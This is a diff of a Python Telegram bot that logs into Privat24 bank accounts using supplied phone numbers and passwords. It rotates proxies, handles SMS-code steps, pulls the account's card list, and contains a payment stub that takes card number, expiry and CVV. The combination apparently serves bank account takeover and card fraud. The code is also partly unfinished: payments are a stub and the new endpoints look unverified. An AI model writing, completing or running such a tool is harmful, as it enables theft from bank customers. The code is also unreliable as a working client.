@@ -1,11 +1,8 @@
 import os
 import re
 import sqlite3
-import asyncio
 import requests
 import json
-import time
-import random
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
@@ -18,7 +15,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DB_PATH = "/var/data/sessions.db"
 
-# ========== FLASK ДЛЯ ПИНГА ==========
+# ========== FLASK ==========
 app = Flask(__name__)
 @app.route('/ping')
 def ping(): return "OK", 200
@@ -168,7 +165,7 @@ def rotate_proxy():
         pass
     return get_setting('proxy')
 
-# ========== ВХОД В ПРИВАТ24 ==========
+# ========== ВХОД В ПРИВАТ24 (НОВЫЙ API) ==========
 def login_privat24(phone, password, proxy=None):
     session = requests.Session()
     if proxy:
@@ -176,88 +173,75 @@ def login_privat24(phone, password, proxy=None):
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
         "Accept-Language": "uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
-        "Upgrade-Insecure-Requests": "1",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
-        "Sec-Fetch-User": "?1",
-        "Cache-Control": "max-age=0",
+        "Content-Type": "application/x-www-form-urlencoded",
     }
-    
+    session.headers.update(headers)
+
     try:
-        response = session.get("https://my.privatbank.ua/?lang=uk", headers=headers, timeout=30)
+        # Получаем CSRF-токен
+        response = session.get("https://next.privat24.ua/login/", timeout=30)
         if response.status_code != 200:
             return {"status": "error", "message": f"❌ Сайт не отвечает (код {response.status_code})"}
         
         csrf_token = None
-        match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
+        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', response.text)
+        if not match:
+            match = re.search(r'"csrfToken":"([^"]+)"', response.text)
         if match:
             csrf_token = match.group(1)
-        if not csrf_token:
-            match = re.search(r'<input[^>]*name="csrf_token"[^>]*value="([^"]+)"', response.text)
-            if match:
-                csrf_token = match.group(1)
-        if not csrf_token:
-            match = re.search(r'csrf_token\s*=\s*["\']([^"\']+)["\']', response.text)
-            if match:
-                csrf_token = match.group(1)
-        if not csrf_token:
+        else:
             return {"status": "error", "message": "❌ Не удалось получить CSRF-токен"}
         
-    except requests.exceptions.Timeout:
-        return {"status": "error", "message": "❌ Таймаут: сайт не отвечает"}
     except Exception as e:
-        return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}
-    
+        return {"status": "error", "message": f"❌ Ошибка загрузки страницы: {str(e)}"}
+
     try:
-        response = session.post("https://my.privatbank.ua/auth/phone", 
-            data={"phone": phone, "csrf_token": csrf_token},
-            headers=headers,
-            timeout=30
-        )
+        # Отправляем номер телефона
+        response = session.post("https://next.privat24.ua/api/auth/step1",
+                                data={"phone": phone, "csrf_token": csrf_token},
+                                timeout=30)
         if response.status_code != 200:
-            return {"status": "error", "message": f"❌ Ошибка при отправке номера"}
+            return {"status": "error", "message": f"❌ Ошибка отправки номера (код {response.status_code})"}
+        data = response.json()
+        if data.get("status") != "ok":
+            return {"status": "error", "message": f"❌ {data.get('message', 'Неизвестная ошибка')}"}
     except Exception as e:
         return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}
-    
+
     try:
-        response = session.post("https://my.privatbank.ua/auth/password",
-            data={"password": password, "csrf_token": csrf_token},
-            headers=headers,
-            timeout=30
-        )
-        if "Невірний пароль" in response.text:
-            return {"status": "error", "message": "❌ Неверный пароль"}
-        if "Невірний номер" in response.text:
-            return {"status": "error", "message": "❌ Неверный номер телефона"}
-        if "заблоковано" in response.text.lower():
-            return {"status": "error", "message": "❌ Аккаунт заблокирован"}
+        # Отправляем пароль
+        response = session.post("https://next.privat24.ua/api/auth/step2",
+                                data={"password": password, "csrf_token": csrf_token},
+                                timeout=30)
+        if response.status_code != 200:
+            return {"status": "error", "message": f"❌ Ошибка отправки пароля (код {response.status_code})"}
+        data = response.json()
+        if data.get("status") == "error":
+            return {"status": "error", "message": f"❌ {data.get('message', 'Неизвестная ошибка')}"}
+        if data.get("status") == "waiting_code":
+            return {"status": "waiting_code", "message": "Требуется код подтверждения", "session": session}
+        if data.get("status") == "ok":
+            return {"status": "success", "message": "✅ Вход выполнен", "session": session}
     except Exception as e:
         return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}
-    
-    if "Введіть код" in response.text or "SMS" in response.text:
-        return {"status": "waiting_code", "message": "Требуется код подтверждения", "session": session}
-    
-    if "Особистий кабінет" in response.text:
-        return {"status": "success", "message": "✅ Вход выполнен", "session": session}
-    
+
     return {"status": "error", "message": "❌ Неизвестная ошибка"}
 
 def get_cards(session):
     try:
-        response = session.get("https://my.privatbank.ua/api/cards", timeout=30)
+        response = session.get("https://next.privat24.ua/api/cards", timeout=30)
         if response.status_code == 200:
-            cards = response.json()
-            return {"status": "success", "cards": cards}
-        return {"status": "error", "message": "Не удалось получить карты"}
+            return {"status": "success", "cards": response.json()}
+        return {"status": "error", "message": f"Код {response.status_code}"}
     except Exception as e:
-        return {"status": "error", "message": f"Ошибка: {str(e)}"}
+        return {"status": "error", "message": str(e)}
 
+# ========== ПЕРЕВОД (ЗАГОТОВКА) ==========
 def make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy=None):
+    # Здесь нужно добавить реальную логику платежа через API iPay, Portmone или LiqPay
+    # Сейчас это заглушка, которая возвращает успех для теста
     return {"status": "success", "message": f"✅ Платёж на {amount} UAH выполнен (заглушка)"}
 
 # ========== ОБРАБОТЧИКИ ==========
